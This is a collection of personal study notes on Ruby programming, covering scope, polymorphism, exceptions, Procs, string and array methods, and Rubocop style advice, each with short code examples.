Let's now take a look at the code below:

```ruby
arr = [9, 8, 7, 6]  # Array initialized to variable arr in the outer scope

for i in arr do     # for keyword
  b = 3             # Integer 3 assigned to variable b
end

puts b              # 3
```

While it would seem `for...do/end` creates a new inner scope, it is actually
not the case. `for` is a
[keyword](https://docs.ruby-lang.org/en/2.7.0/doc/keywords_rdoc.html) part of
the Ruby language and not a method invocation.

This is why in this case, even though it is followed by `{}` or `do/end`, no
block are being defined.


===

<!-- Source: computing/software/ruby/polymorphism.md -->
<!-- URL: /computing/software/ruby/polymorphism -->
<!-- Title: Polymorphism -->
<!-- Wikilinks: [[computing/software/ruby/polymorphism]], [[software/ruby/polymorphism]], [[ruby/polymorphism]], [[polymorphism]] -->

---
date: 2021-06-01T08:40
---

# Polymorphism

Polymorphism describes the concept where objects **of different types** can
be accessed through the same interface. This is a core concept of Object
Oriented Programming.

With polymorphism, the code that handles the interaction is agnostic about
the types of objects interacting ; it only cares about the objects' _public
interfaces_. As long as this public interface exists, the implementation of
the object or even its type is irrelevent.

{.ui .message .info}
Note that polymorphism needs _intent_ to be polymorphic. Otherwise they are
just two objects which have a behavior of the same name (not a common
behavior).

## Achieve Polymorphism in Ruby

There are three ways to achieve polymorphism in Ruby.

### Polymorphism through Inheritance

The first way uses inheritance. The class that inherits is called
**subclass** while the one which is being inherited from is the
**superclass**.

This is probably the most common form of polymorphism.

```ruby
class Shape
  def area; end
end

class Circle < Shape
  def initialize
    @r = 5
  end

  def area
    Math::PI * @r**2
  end
end

class Triangle < Shape
  def initialize
    @b = 5
    @h = 6
  end

  def area
    (@b * @h) / 2
  end
end

class Rectangle < Shape
  def initialize
    @a = 10
    @b = 8
  end

  def area
    @a * @b
  end
end

shapes = [Circle.new, Triangle.new, Rectangle.new]

shapes.each do |shape|
  puts "#{shape.class}'s area: #{shape.area}"
end
```

In the code above, we can treat the same way every element of the array the
local variable `shapes` is pointing to, as long as they implement a common
interface: in this case the `area` method (and, one can argue the `class`
method as well).

We choose to use plane figures for our example but any object would work as
lond as they implement a `area` method.

```ruby
class Sphere < Shape
  def initialize
    @r = 5
  end

  def area
    4 * Math::PI**2
  end
end

# Passed to the array object above, this would return:
# => Sphere's area: 39.47841760435743
```

Let's also imagine a shape object that doesn't have an area in our
dimension:

```ruby
class AnotherDimensionObject < Shape; end

# => AnotherDimensionObject's area:
```

No result were output but no error were raised either. While
`AnotherDimensionObject` does not implement a `area` method, its superclass
`Shape` does.

Again, from the point of view of the code which calls `area` on every
object, the fact that each object implements `area` widely differently or
does not implement it but their superclass does, is irrelevent as long as
the interface exists and is public (accessible).

### Polymorphism through Module

Using module to achieve polymorphism is similar to inheritance. The only
difference is object cannot be instanciated from a module. A module must
be mixed in with a class using the `include` method invocation. This is
called **mixin**.

Let's rewrite the example from inheritance using a module:

```ruby
module Shape
  def area; end
end

class Circle
  include Shape

  def initialize
    @r = 5
  end

  def area
    Math::PI * @r**2
  end
end

class Triangle
  include Shape

  def initialize
    @b = 5
    @h = 6
  end

  def area
    (@b * @h) / 2
  end
end

class Rectangle
  include Shape

  def initialize
    @a = 10
    @b = 8
  end

  def area
    @a * @b
  end
end

class Sphere
  include Shape

  def initialize
    @r = 5
  end

  def area
    4 * Math::PI**2
  end
end

class AnotherDimensionObject
  include Shape
end

shapes = [Circle.new, Triangle.new, Rectangle.new,
          Sphere.new, AnotherDimensionObject.new]

shapes.each do |shape|
  puts "#{shape.class}'s area: #{shape.area}"
end

# Circle's area: 78.53981633974483
# Triangle's area: 15
# Rectangle's area: 80
# Sphere's area: 39.47841760435743
# AnotherDimensionObject's area:
```

### Polymorphism through Duck Typing

See [[duck-typing]]#.


===

<!-- Source: computing/software/ruby/puts-return.md -->
<!-- URL: /computing/software/ruby/puts-return -->
<!-- Title: puts vs return -->
<!-- Wikilinks: [[computing/software/ruby/puts-return]], [[software/ruby/puts-return]], [[ruby/puts-return]], [[puts-return]] -->

---
date: 2020-09-22T14:28
---

# puts vs return

Let's use a simple code snippet to explain the difference between `puts` and
`return`.

```ruby
list = [1, 2, 3]

def mutate(array)
  array.pop
end

p "Before mutate method: #{list}" # "Before mutate method: [1, 2, 3]"
p mutate(list)                    # 3
p "After mutate method: #{list}"  # "After mutate method: [1, 2]"
```

The result should not be surprising if we know the following:

* Ruby methods _always_ return the evaluated result of the last line that is
  executed (i.e., we could have written `return array.pop` in our method)
* Difference between [[pass-by-reference-pass-by-value]]#

Now let's modify our code a little bit and include the Kernel method `puts`:

```ruby
list = [1, 2, 3]

def mutate(array)
  puts array.pop                  # 3
end

p "Before mutate method: #{list}" # "Before mutate method: [1, 2, 3]"
p mutate(list)                    # nil
p "After mutate method: #{list}"  # "After mutate method: [1, 2]"
```

The order of the comments above is a bit confusing ; the results come up this
way:

```ruby
"Before mutate method: [1, 2, 3]"
3
nil
"After mutate method: [1, 2]"
```

What is surprising the first time we encounter it is the `nil` result on the
penultimate line, although the result inside the method `mutate` is `3`. This
is because the Kernel method `puts` output what is passed to it but returns `nil`.

{.ui .info .message}
Good to know: the method `p` output what is passed to it but also returns the
result. `p array.pop` would have output `3` and returned `3` here.



===

<!-- Source: computing/software/ruby/rbenv-versions-gems.md -->
<!-- URL: /computing/software/ruby/rbenv-versions-gems -->
<!-- Title: rbenv Ruby versions and gems -->
<!-- Wikilinks: [[computing/software/ruby/rbenv-versions-gems]], [[software/ruby/rbenv-versions-gems]], [[ruby/rbenv-versions-gems]], [[rbenv-versions-gems]] -->

---
date: 2021-07-29T20:26
---

# rbenv Ruby versions and gems

When installing a new Ruby version with `rbenv`, the new versions won't
generally have appropriates gems to go with. However Trying to install the
appropriate gems seems to work at first but when trying to invoke said gem,
it often results in the following error (for example with `bundle`):

```
rbenv: bundle: command not found

The `bundle' command exists in these Ruby versions:
3.0.2
```

The following commands seems to fix things, although not always it seems:

```
gem update --system
```

Throwing in a `rbenv rehash` after installing the gem does not hurt as
well.


===

<!-- Source: computing/software/ruby/return-last-n-digits-ruby.md -->
<!-- URL: /computing/software/ruby/return-last-n-digits-ruby -->
<!-- Title: Return the Last n Digits in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/return-last-n-digits-ruby]], [[software/ruby/return-last-n-digits-ruby]], [[ruby/return-last-n-digits-ruby]], [[return-last-n-digits-ruby]] -->

---
date: 2020-08-25T09:00
---

# Return the Last n Digits in Ruby

Suppose we have a list of string numbers `all_digits` and want to use the last
`n` digits. We can use a handy shorthand to achieve this:

```ruby
all_digits = %w(1 6 1 8)
n = 2

last_digits = all_digits[-n..-1] # => ["1", "8"]
```


===

<!-- Source: computing/software/ruby/rubocop.md -->
<!-- URL: /computing/software/ruby/rubocop -->
<!-- Title: Rubocop -->
<!-- Wikilinks: [[computing/software/ruby/rubocop]], [[software/ruby/rubocop]], [[ruby/rubocop]], [[rubocop]] -->

---
date: 2020-08-13
tags:
  - ruby
---

# Rubocop

Rubocop is a linter for Ruby. It correct style and gives advices and
suggestions to make the code more readable.

While it gives great indication, Rubocop should not have the last say on wether
or not a certain code should be rewritten or refactored.

It is possible to temporary desactivate onr or more check by surrounding it 
with the following keywords:

```ruby
# rubocop:disable Metrics/AbcSize, Another/Rule
def my_orsum_method
  # foo bar
end
# rubocop:enable Metrics/AbcSize, Another/Rule
```


===

<!-- Source: computing/software/ruby/ruby-array-any.md -->
<!-- URL: /computing/software/ruby/ruby-array-any -->
<!-- Title: Ruby’s any? Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-array-any]], [[software/ruby/ruby-array-any]], [[ruby/ruby-array-any]], [[ruby-array-any]] -->

---
date: 2021-03-15T16:54
---

# Ruby's any? Method

The `Array#any?` extends the `Enumerable#any?` method. This method passes each
element of the collection it is called upon (here, an Array) to a block or a
pattern and return `true` if one of the block returns a truthy ([[difference-between-boolean-values-truthy-falsey]])
or if the pattern is equal to at least one of the element.

If no block or pattern is provided, an implicit `{ |obj| obj| }` block is
passed in as an argument, which wil cause `any?` to return `true` if at least
one of the collection elements is a truthy (not `false` or `nil`)

```ruby
[10, 5, 3].any? { |element| element > 8 }  # => true
%w[Ceci n'est pas une pipe].any?(/pipe/)   # => true
```


===

<!-- Source: computing/software/ruby/ruby-case-one-liner.md -->
<!-- URL: /computing/software/ruby/ruby-case-one-liner -->
<!-- Title: Ruby’s case Statement One Liner -->
<!-- Wikilinks: [[computing/software/ruby/ruby-case-one-liner]], [[software/ruby/ruby-case-one-liner]], [[ruby/ruby-case-one-liner]], [[ruby-case-one-liner]] -->

---
date: 2021-03-16T19:49
---

# Ruby's case Statement One Liner

Ruby's `case` can be written with a comparison value behind it, without it
([[ruby-case-statement-without-comparison-value]]), and using a one liner.

```ruby
case num
when num % 3 == 0 && num % 5 == 0 then 'FizzBuzz'
when num % 5 == 0                 then 'Buzz'
when num % 3 == 0                 then 'Fizz'
else num
end
```


===

<!-- Source: computing/software/ruby/ruby-case-statement-without-comparison-value.md -->
<!-- URL: /computing/software/ruby/ruby-case-statement-without-comparison-value -->
<!-- Title: Ruby’s case Statement Witout Comparison Value -->
<!-- Wikilinks: [[computing/software/ruby/ruby-case-statement-without-comparison-value]], [[software/ruby/ruby-case-statement-without-comparison-value]], [[ruby/ruby-case-statement-without-comparison-value]], [[ruby-case-statement-without-comparison-value]] -->

---
date: 2020-08-23T11:45
---

# Ruby's case Statement Witout Comparison Value

Ruby's `case` statement is genrally written with a comparison value behind it.

However, it is possible create a `case` statement without comparison value.
In that case, it is equivalent in functionality to an `if elsif else`
conditional.

```ruby
case
when number % 3 == 0 && number % 5 == 0
  'FizzBuzz'
when number % 5 == 0
  'Buzz'
when number % 3 == 0
  'Fizz'
else
  number
end
```

Rubocop however, recommand to use an `if` expression:

```
Style/EmptyCaseCondition: Do not use empty case condition, instead use an if
expression.
```

```ruby
if number % 3 == 0 && number % 5 == 0
  'FizzBuzz'
elsif number % 5 == 0
  'Buzz'
elsif number % 3 == 0
  'Fizz'
else
  number
end
```


===

<!-- Source: computing/software/ruby/ruby-comparable.md -->
<!-- URL: /computing/software/ruby/ruby-comparable -->
<!-- Title: Ruby’s Comparable -->
<!-- Wikilinks: [[computing/software/ruby/ruby-comparable]], [[software/ruby/ruby-comparable]], [[ruby/ruby-comparable]], [[ruby-comparable]] -->

---
date: 2021-03-13T18:57
---

# Ruby's Comparable

Every comparable methods in Ruby are implemented with `<=>`.

"Is equal to" (`==`), "not equal to" (`!=`), "less than" (`<`) and "greater
than" (`>`) operators and symbols are pretty straightforward.

One method I often forget is the `Comparable#between`: this useful method is
called with two parameters: a minimum and a maximum. It returns a Boolean,
`true` or `false`, depending on the result of the comparison between the object
it is called upon and the two parameters.

From the doc:

```ruby
3.between?(1, 5)               #=> true
6.between?(1, 5)               #=> false
'cat'.between?('ant', 'dog')   #=> true
'gnu'.between?('ant', 'dog')   #=> false
```


===

<!-- Source: computing/software/ruby/ruby-difference-sort-sort-by.md -->
<!-- URL: /computing/software/ruby/ruby-difference-sort-sort-by -->
<!-- Title: Difference Between sort and sort_by in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/ruby-difference-sort-sort-by]], [[software/ruby/ruby-difference-sort-sort-by]], [[ruby/ruby-difference-sort-sort-by]], [[ruby-difference-sort-sort-by]] -->

---
date: 2021-03-15T18:12
---

# Difference Between sort and sort_by in Ruby

Ruby has two (and probably more) methods to easily sort collection: `sort` and
`sort_by`. The distinction between the two methods is not clear while reading
the documentation, therefore I will try to sum up the main points.

## sort

`sort` compares two elements using the `<=>` operator or an optional code
block.

If called with a block, it needs two parameters, noted `a` and `b` in the
official documentation, which are compared and return `-1` if the first operand
(`a`) is less than the second (`b`), `0` if they are equal and `1` if the first
operand is greater than the second. The return values shuffle up and down the
elements until they are in the specified order.

```ruby
[1, 5, 6, 2, 9, 2].sort { |a, b| b <=> a }  # => [9, 6, 5, 2, 2, 1]
```

## sort_by

In contrast, `sort_by` needs to be called passing in a block in order to return
the same collection object it was called upon (passing in nothing will return
an enumerator).

The block itself needs only one parameter (a second parameter would return
`nil` for each iteration). Inside the block, the argument needs to be
manipulated in such a way as to make it possible to sort it. For example:

```ruby
%w[rangers power].sort_by { |string| string.length }  # => ["power", "rangers"]
```

Here, `string` is rendered sortable by characters length thanks to the `length`
method[^1].

The other difference between `sort` and `sort_by` is that the later implements
a [Schwartzian
transformation](https://www.perl.com/article/the-history-of-the-schwartzian-transform/).

Simply explained, it assigns (or maps) a sort key to each element of the
collection it is called upon, and sort thoses keys and mapped back onto the
original values (well, that wasn't simply explained after all).

`sort_by` is fairly expensive when used on small collection and `sort` should
be prefered for simpler sorting.

[^1]: `string` alone is actually already sortable because the collection `sort_by` is called upon only contains String object, which are sortable.


===

<!-- Source: computing/software/ruby/ruby-exceptions.md -->
<!-- URL: /computing/software/ruby/ruby-exceptions -->
<!-- Title: Ruby Exceptions -->
<!-- Wikilinks: [[computing/software/ruby/ruby-exceptions]], [[software/ruby/ruby-exceptions]], [[ruby/ruby-exceptions]], [[ruby-exceptions]] -->

---
date: 2021-04-23T19:47
---

# Ruby Exceptions

## What is an Exception?

**Exceptions** are an _exceptional state_ in the course of the code. It's a way
for the programming language to let the programmer/user know that there is an
unforseen process causing unexpected behavior.

In most programming language, when an exception is raised, the program stops
and a message is sent back.

```ruby
42 + 'answer'
# => TypeError (String can't be coerced into Integer)
```

A lot of programming language provides a hierarchy of built-in classes to
simplify the exception handling.

In Ruby, the very first exception class is the `Exception` class, which has
several subclasses, many of which also have descendents of their own.

## Exception to Handle

Exceptions can and for some should be handled. In Ruby, the descendents of the
`StandardError` class are errors which are safe to handle. They are caused by
circumstances such as unexpected user input, faulty type conversions or
dividing by zero.

Some errors, however, must not be handled; doing so would be dangerous.
Handling them would result in masking critical errors and can make debugging
more difficult than it already is.

This include importants errors such as `NoMemoryError`, `SyntaxError` and
`LoadError`.

## How to Handle an Exceptional State

In Ruby, we use the `begin`/`rescue` block to handle errors. The block prevent
your program from stopping if the specified exception is raised.

```ruby
begin
  # do something dangerous here
rescue TypeError
  # do something if TypeError is raised
rescue ArgumentError
  # do something else if ArgumentError is raised
end
```

{.ui .info .message}
When no type of exception to rescue is specified behind the `rescue` clause,
all `StandardError` exceptions will be rescued and handled by default.

When a issue is raised between `begin` and `rescue`, Ruby stops the
execution of the code and goes straight to the `rescue` block. In other
words:

```ruby
begin
  array.fetch(index) # The index is out of bonds
  puts "This code won't execute if out of bonds"
rescue IndexError
  puts "Out of bonds!"
end
```

In the code above, te `puts` method call behind the `array.fetch` line will
not execute if `index` is out of bonds; Ruby goes straight to `rescue`.

{.ui .warning .message}
Do not rescue `Exception` as this will rescue _all_ exceptions.

It is also possible to specify multiple exception on the same line in order to
take the same action for more than one type of exception:

```ruby
begin
  # do something dangerous here
rescue ZeroDivisionError, TypeError
  # do something if ZeroDivisionError or TypeError are raised
end
```

## Useful Clauses in Ruby

There are several useful clause to use along the `begin`/`rescue` block. Let's
see some of them.

```ruby
begin
  # do something dangerous here
rescue
  # handle the inevitable exception
ensure
  # do this every time, exception or not
end
```

`ensure` is run whether an exception was raised or not. It's useful to close
file or connection with database, for example.

Another example is `retry`: it lets you retry running your code after it raised
an exception:

```ruby
RETRY_LIMIT = 5

begin
  attempts = attempts || 0
  # do something dangerous
rescue
  attempts += 1
  retry if attempts < RETRY_LIMIT
end
```

This is useful when dealing with network connection and remote connection,
where the line can sometime be busy.

## Manually Raising Exceptions

It is possible to manually raises exception. In Ruby, it is done with the...
`raise` method!

```ruby
raise TypeError.new("Task failed successfully.")
```

{.ui .info .message}
If no exception is specified, Ruby will default to `RuntimeError`.

Exceptions raised manually can, or course, be handled in the same manner as
exceptions Ruby raises automatically.

## Crate Custom Exceptions

Exceptions being classes, we can create our own custom exception classes, if we
so wish.

```ruby
class ValidateSomethingError < StandardError
  # validate something one way or anotehr
end
```

{.ui .info .message}
Most of the time, you will want to inherit from `StandardError`. **Do
not** inherit from `Exception` for the same reasons described above.

[Source](https://launchschool.com/blog/getting-started-with-ruby-exceptions)


===

<!-- Source: computing/software/ruby/ruby-gets-chomp.md -->
<!-- URL: /computing/software/ruby/ruby-gets-chomp -->
<!-- Title: Ruby’s gets and chomp -->
<!-- Wikilinks: [[computing/software/ruby/ruby-gets-chomp]], [[software/ruby/ruby-gets-chomp]], [[ruby/ruby-gets-chomp]], [[ruby-gets-chomp]] -->

---
date: 2021-03-13T19:09
---

# Ruby's gets and chomp

To get data form the user, Ruby provides the `gets` ("get string") method.

When using it, the program wait for the user input and the press of the enter
key. This last action leaves a newline character at the end of the string.

```irb
irb :001 > animal = gets
Flamingo
=> "Flamingo\n"
```

To get rid of it, we can chain the `chomp` method to `gets`:

```irb
irb :001 > animal = gets.chomp
Flamingo
=> "Flamingo"
```

Note that, as its name indicates, the `gets` method always returns a String
object.

```irb
irb :001 > num = gets.chomp
9
=> "9"
irb :002 > num = gets.chomp.to_i
9
=> 9
```


===

<!-- Source: computing/software/ruby/ruby-kernel-format.md -->
<!-- URL: /computing/software/ruby/ruby-kernel-format -->
<!-- Title: Ruby’s format Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-kernel-format]], [[software/ruby/ruby-kernel-format]], [[ruby/ruby-kernel-format]], [[ruby-kernel-format]] -->

---
date: 2021-03-15T10:14
---

# Ruby's format Method

To format a String in Ruby we can use the `Kernel#format` or `Kernel#sprintf`
method. They work by returning a copy of the String passed in, with its _format
sequence_ replaced by the additional arguments passed to it. This is easier
with an example:

```ruby
sprintf('%d %d', 20, 10)  # => "20 10"
```
The first argument passed in method `sprintf` is a String object containing two
_format sequences_.

A format sequence is a parcent sign followed by flags, width and precision
indicators, then terminated with a field type character.

```
%[flags][width][.precision]type
```

In the example above, the `d` in `%d` is the _field type_ character. It converts
the passed argument as a decimal number.

The `[width]` controls the size of the returned String object, while
`[.precision]` mainly specify the number of digits after the decimal points.

A common use for `format` or `sprintf` is to format the result of Float
objects.

```ruby
format('%f', 1.0/3.0)    # => "0.333333"
format('%.2f', 1.0/3.0)  # => "0.33"
```

Note the use of the dot `.` before the precision number.

## String#% Method

[Rubocop](https://github.com/rubocop/ruby-style-guide#sprintf) advises against
using the `String#%` method:

> Prefer the use of `sprintf` and its alias `format` over the fairly
> cryptic `String#%` method.

The documentation does not give any reason why. `Kernel#sprintf` and
`String#%` basically do the same thing. However, `String#%` is an instance
method of the String class, while the former is a command.

[On his
blog](https://batsov.com/articles/2013/06/27/the-elements-of-style-in-ruby-number-2-favor-sprintf-format-over-string-number-percent/),
Rubocop's author gives several answer:

One reason to prefer the Kernel methods over the String method is the
inconsistencies of the `%` method which takes either a single element or an
array of elements. Another reason is its cryptic meaning: `%` can either be a
modulo or the `String#%` method, which, without context is hard to parse:

```ruby
a % b
```

Even with hardcoded values, the repetition of the `%` symbol is difficult to
parse:

```ruby
'%d %d' % [20, 10]  # => "20 10"
```


===

<!-- Source: computing/software/ruby/ruby-new-class.md -->
<!-- URL: /computing/software/ruby/ruby-new-class -->
<!-- Title: Ruby’s ::new Class -->
<!-- Wikilinks: [[computing/software/ruby/ruby-new-class]], [[software/ruby/ruby-new-class]], [[ruby/ruby-new-class]], [[ruby-new-class]] -->

---
date: 2021-03-15T08:55
---

# Ruby's ::new Class

`::new` is a _class_ method: it creates an instance of the class.

Ruby generally offers two ways to create an object. For example the Array
object can be created the following ways:

- `array1 = Array.new` (the `::new` class method)
- `array2 = []` (a shorthand method)

Functionnally and speed is the same, however `Array.new` can be called passing
in a block, while `[]` cannot.

Codes behing written for people first, linter such as Rubocop prefers[^1] `[]`
for creating empty Array and `Array.new(n)` when creating an Array object,
passing in parameter `n`.

[^1]:[Literal Array and Hash](https://github.com/rubocop/ruby-style-guide#literal-array-hash)


===

<!-- Source: computing/software/ruby/ruby-parallel-assignment.md -->
<!-- URL: /computing/software/ruby/ruby-parallel-assignment -->
<!-- Title: Ruby’s Parallel Assignment -->
<!-- Wikilinks: [[computing/software/ruby/ruby-parallel-assignment]], [[software/ruby/ruby-parallel-assignment]], [[ruby/ruby-parallel-assignment]], [[ruby-parallel-assignment]] -->

---
date: 2020-08-18
---

# Ruby's Parallel Assignment

Ruby, like other programming languages suchas Go, JavaScript, PHP, Lua and
Python, allows several variables to be assigned in parallel. This is called
**parallel assignment**[^1].

```ruby
array = [1, 2, 3]
left_index = 0
right_index = -1

array[left_index], array[right_index] = array[right_index], array[left_index]

p array # => [3, 2, 1]
```

The idiom on line 5 is used to swap two values without the use of an
intermediate variable. Good to know.


[^1]: Also called **simultaneous assignment** or sometimes **multiple
  assignment** through this can be confusing when used with simple assignment.


===

<!-- Source: computing/software/ruby/ruby-pass-by-reference-of-the-value.md -->
<!-- URL: /computing/software/ruby/ruby-pass-by-reference-of-the-value -->
<!-- Title: Ruby’s Pass by Reference of the Value -->
<!-- Wikilinks: [[computing/software/ruby/ruby-pass-by-reference-of-the-value]], [[software/ruby/ruby-pass-by-reference-of-the-value]], [[ruby/ruby-pass-by-reference-of-the-value]], [[ruby-pass-by-reference-of-the-value]] -->

---
date: 2020-08-07
tags:
  - programming
---

# Ruby's Pass by Reference of the Value

As seen in [[pass-by-reference-pass-by-value]], there are mainly two ways of dealing with objects passed
into methods: **Pass by Reference** and **Pass by Value**.

However, Ruby does things slightly differently:

When passing a object to a method, the object is scoped to this method
definition level. Reassigment of the object won't affect the original object.
_However_, when performing an action that **mutates the caller**, the original
object is altered as well.

This is called **Pass by Reference Value**, **Pass by Reference of the Value**,
**Pass by Value of the Reference** or **Call by Sharing**.

The different naming are utterly confusing but they mean that Ruby passes
_copies_ of the references.

## Caveat

1. Immutable object, like literals or boolean, can't be mutated and are
   therefore not affected (see [[mutable-and-immutable-objects]]#).
2. Only _operations which mutate the caller (destructive)_ alter the original
   object. Unfortunately there is no rule as to which operation are destructive
   or not. Some methods end with a `!` but this is just a naming convention,
   not a hard rule.
3. Ruby's variable don't contains objects but references to objects. A literal
   will be converted first into an object, then, internally, create a reference
   to the object. Those literal references are called _anonyous references_.

## Examples

Equivalent of a Pass by Value in Ruby:

```ruby
def assign(list, animal)
  list + [animal]
end

list = %w(flamingo capybara)
assign(list, 'red panda')
p list # ["flamingo", "capybara"]
```

Equivalent of a Pass by Reference in Ruby:

```ruby
def mutate(list, animal)
  list << animal
end

list = %w(flamingo capybara)
mutate(list, 'red panda')
p list # ["flamingo", "capybara", "red panda"]
```


## Tips

Every object in Ruby has a unique object ID: strings, literals, booleans, `nil`,
range etc. Using Ruby's `$object_id` is useful to inspect an unexpected value
in a program.

```irb
>> 7.object_id
=> 15

>> true.object_id
=> 20

>> nil.object_id
=> 8

>> 'flamingo'.object_id
=> 180

>> (1..100).object_id
=> 13320
```

## Mental Model

Ruby is neither Pass by Value or Pass by Reference, Ruby is:
* **Pass by Value** for _immutable_ objects:
  ```ruby
  def increment(a)
    a = a + 1
  end

  b = 3
  puts increment(b)  # 4
  puts b             # 3
  ```
* **Pass by Reference** for _mutable_ objects:
  ```ruby
  def append(s)
    s << '*'
  end

  t = 'abc'
  puts append(t)  # abc*
  puts t          # abc*
  ```


For more:
* [Introduction to Programming with Ruby by Launch School](https://launchschool.com/books/ruby/read/methods#mutatingthecaller)
* [Variable References and Mutability of Ruby Objects](https://launchschool.com/blog/references-and-mutability-in-ruby)



===

<!-- Source: computing/software/ruby/ruby-proc-and-scope.md -->
<!-- URL: /computing/software/ruby/ruby-proc-and-scope -->
<!-- Title: Ruby’s Proc and its Scope -->
<!-- Wikilinks: [[computing/software/ruby/ruby-proc-and-scope]], [[software/ruby/ruby-proc-and-scope]], [[ruby/ruby-proc-and-scope]], [[ruby-proc-and-scope]] -->

---
date: 2021-06-16T09:41
---

# Ruby's Proc and its Scope

A Proc is an _unnamed_ "chunk of code" that can be passed around in the
codebase to be executed at a later date.

```ruby
animal = "Flamingo"

chunk_of_code = Proc.new { puts "Look at this #{animal}!" }
```

Nothing is outputed in the code above. Our `Proc` object is saved into
local variable `chunk_of_code`.

Let's add a method that can execute a Proc, and pass `chunk_of_code` to it.

```ruby
def call_proc(my_code)
  my_code.call # The chunk of code will be executed here
end

animal = "Flamingo"
chunk_of_code = Proc.new { puts "Look at this #{animal}!" }

call_proc(chunk_of_code)
# Look at this Flamingo!
# => nil
```

The code above leads us to an interesting topic called...

## Variable Scope of Blocks

We know from [[local-variable-scope]] that variable initialized _outside_ a method
definition aren't accessible _inside_ the method. But the code above
clearly knows about the `animal` local variable.

One would think it's because the Proc was pre-processed ; the local
variable `animal` is initialized then passed to the Proc which somehow
remember the value the variable is pointing to. However if we decide to
reassign the local variable `animal`, we soon learn that this theory
doesn't hold:

```ruby
def call_proc(my_code)
  my_code.call # The chunk of code will be executed here
end

animal = "Flamingo"
chunk_of_code = Proc.new { puts "Look at this #{animal}!" }
animal = "Red Panda"

call_proc(chunk_of_code)
# Look at this Red Panda!
# => nil
```

The Proc, called from _inside_ the method is aware of the new value of
local variable `animal` reassigned _outside_ the method. This is because
Proc **keeps track of its surrounding context**. In Ruby, this is called
the **binding of Proc**.

{.ui .info .message}
The binding of a closure doesn't stop at local variables, but also include
method references, constants and other artifacts.

{.ui .warning .message}
Local variable that need to be accessed by a closure must be defined
_before_ the closure is created if it is not explicitly passed to the
closure when called.


===

<!-- Source: computing/software/ruby/ruby-splat-operator.md -->
<!-- URL: /computing/software/ruby/ruby-splat-operator -->
<!-- Title: Ruby’s *Splat Operator -->
<!-- Wikilinks: [[computing/software/ruby/ruby-splat-operator]], [[software/ruby/ruby-splat-operator]], [[ruby/ruby-splat-operator]], [[ruby-splat-operator]] -->

---
date: 2020-08-13
---

# Ruby's *Splat Operator

The splat operator `*` is usefull in combination of a method which takes
variables arguments.

When using an array as argument, the splat operator converts the array into a
list of its elements.

```ruby
first, *rest, last = %w(a b c d e f g h)
p first # => "a"
p last # => "h"
p rest # => ["b", "c", "d", "e", "f", "g"]
```

As the splat operator `*` was used on `rest`, it took everything between the
first and last variables.


## Double **Splat Operator

_ToDo_


===

<!-- Source: computing/software/ruby/ruby-static-method.md -->
<!-- URL: /computing/software/ruby/ruby-static-method -->
<!-- Title: Ruby’s Static Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-static-method]], [[software/ruby/ruby-static-method]], [[ruby/ruby-static-method]], [[ruby-static-method]] -->

---
date: 2021-07-19T09:44
---

# Ruby's Static Method

To make a class method private, one would assume the folowing code:

```ruby
class MyClass
  # omitted for brevity

  private

  def self.my_method
    # do something
  end
end
```

However this code does not work as expected. `private` method does _not_
work on class methods, only instance methods.

To make a class methods private, one need to use the `class << self` idiom,
which lets us operate on the class itself as an object.

```ruby
class MyClass
  # omitted for brievety

  class << self
    private

    def my_method
      # do something
    end
  end
end
```

{.ui .info .message}
`class << self` needs to be closed with `end`. Also, methods inside it do
not need to be prepended with `self`.

The method `my_method` in the code above is a **class (or static) method**.


===

<!-- Source: computing/software/ruby/ruby-string-casecmp.md -->
<!-- URL: /computing/software/ruby/ruby-string-casecmp -->
<!-- Title: Ruby’s casecmp? Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-string-casecmp]], [[software/ruby/ruby-string-casecmp]], [[ruby/ruby-string-casecmp]], [[ruby-string-casecmp]] -->

---
date: 2021-03-15T09:39
---

# Ruby's casecmp? Method

To compare two strings without worrying about their case, one can call the
`String#casecmp?` method.

This method returns `true` if the String passed in as an argument to the method
is equal after Unicode case folding to the String the method is called upon,
and `false` otherwise.

```ruby
'ReD PaNda'.casecmp?('rEd PAnDa')   # => true
'ReD PaNdas'.casecmp?('rEd PAnDa')  # => false
```


===

<!-- Source: computing/software/ruby/ruby-string-center.md -->
<!-- URL: /computing/software/ruby/ruby-string-center -->
<!-- Title: Ruby’s center Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-string-center]], [[software/ruby/ruby-string-center]], [[ruby/ruby-string-center]], [[ruby-string-center]] -->

---
date: 2021-03-15T16:34
---

# Ruby's center Method

Ruby provides a String method to center a String object according to a width,
passed in as a parameter.

The width does not include the String object's length it is called upon,
therefore a good trick to center a text is to add the String length plus an
even number for the space surrounding it.

```ruby
text = 'Nicky Larson'

text.center(text.length + 4)  # => "  Nicky Larson  "
```

The default padding string is a whitespace (`' '`) but it can be modified:

```ruby
text.center(text.length + 4, '*')  # => "**Nicky Larson**"
```


===

<!-- Source: computing/software/ruby/ruby-string-delete-count.md -->
<!-- URL: /computing/software/ruby/ruby-string-delete-count -->
<!-- Title: Ruby’s delete and count Method -->
<!-- Wikilinks: [[computing/software/ruby/ruby-string-delete-count]], [[software/ruby/ruby-string-delete-count]], [[ruby/ruby-string-delete-count]], [[ruby-string-delete-count]] -->

---
date: 2021-03-15T14:03
---

# Ruby's delete and count Method

`String#delete` returns a copy of the String object it is called upon, and
deletes characters at the _intersection_ of its arguments. The rules are the
same as the `String#count` method, therefore it is important to understand this
method first.

## The count Method

The `String#count` method is called passing in one or more argument and returns
an Integer. When two arguments are passed in, the return value is the count of
the characters ate the _intersection_ of the passed arguments.

The
[intersection](https://stackoverflow.com/questions/600574/the-string-count-method)
is a set containing all the elements common to the first and second set. Here,
the sets are the passed arguments. It can be a String object (`'e'`) or a
sequence (`'a-d'`, which translates to `a`, `b`, `c` and `d`). Sequences shall
not be confused with multiple characters: `a-d` is different than `ad` ; the
later translate to `a` and `d`.

In other words, if a characters appears in the first argument (the first set)
and in the second argument (the second set), it is at the intersection of both
arguments/sets and, therefore, will be counted.

### Examples

Given a String object `panda`, let's find and count the characters at the
intersection of `an` and `a`.

For the sake of simplicity, we will number each characters as follow:

```
panda
12345
```

```ruby
'panda'.count('an')       # => 3
# Counts characters 2, 3 and 5 (set A)
'panda'.count('a')        # => 2
# Counts characters 2 and 5 (set B)
'panda'.count('an', 'a')  # => 2
# Counts characters at the intersection of sets A and B (2 and 5)
```

